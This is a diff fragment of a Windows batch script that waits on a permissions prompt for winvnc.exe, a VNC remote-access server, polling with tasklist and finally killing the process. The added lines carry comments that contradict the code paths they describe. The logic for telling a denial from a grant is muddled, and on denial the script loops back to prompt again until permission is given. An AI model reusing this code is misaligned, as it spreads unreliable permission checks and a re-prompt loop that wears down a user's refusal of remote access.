@@ -53,12 +53,20 @@ REM Permissions prompt detected, wait for user decision
 echo Waiting for user to allow permissions...
 timeout /t 2 >nul
 tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
+if not errorlevel 1 (
+  REM If process is found, check again until it is terminated or allowed
+  goto WaitForDecision
+)
+
+REM If the process is not found, it means the user denied permissions or allowed it
+timeout /t 2 >nul
+tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
 if errorlevel 1 (
-  REM If process is not found, it means the user denied permissions, retry
+  REM If process is not found after timeout, user denied permissions, retry
   goto CheckPermissions
 )
 
-REM If the process is still running, assume permissions are granted and proceed
+REM If the process is still not found, assume permissions are granted and proceed
 echo winvnc.exe has permissions. Proceeding...
 taskkill /im winvnc.exe /f
 
